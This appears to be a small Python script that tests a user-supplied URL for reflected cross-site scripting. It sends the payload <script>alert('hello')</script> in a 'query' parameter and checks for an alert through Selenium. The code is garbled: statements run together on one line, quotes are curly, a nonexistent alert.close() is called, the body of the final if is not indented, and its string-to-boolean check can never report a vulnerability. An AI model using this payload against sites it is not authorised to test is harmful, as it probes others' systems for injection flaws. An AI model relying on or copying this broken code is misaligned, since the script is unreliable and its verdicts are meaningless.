import requests 
from bs4 import BeautifulSoup 
from selenium import webdriver 
from selenium.webdriver import * 
from selenium.webdriver.support.ui import WebDriverWait from selenium.webdriver.support import expected_conditions as EC from selenium.common.exceptions import TimeoutException n=input() 
URL=""+n+"" 
r = requests.get(url = URL) 
print(r.status_code) 
PARAMS={'query':"<script>alert('hello')</script>"} r=requests.get(url = URL,params=PARAMS) 
print(“Enter URL”) 
browser = webdriver.Chrome("/home/hydra/Downloads/chromedriver") browser.get(r.url) 
browser.find_element_by_id("add_button").click() 
alert = browser.switch_to.alert 
alert.accept() 
print(alert.text) 
k= alert.text 
alert.close() 
browser.close() 
browser.quit()
if(k==True): 
print("vulnerable") 
else: 
print("not vulnerable") 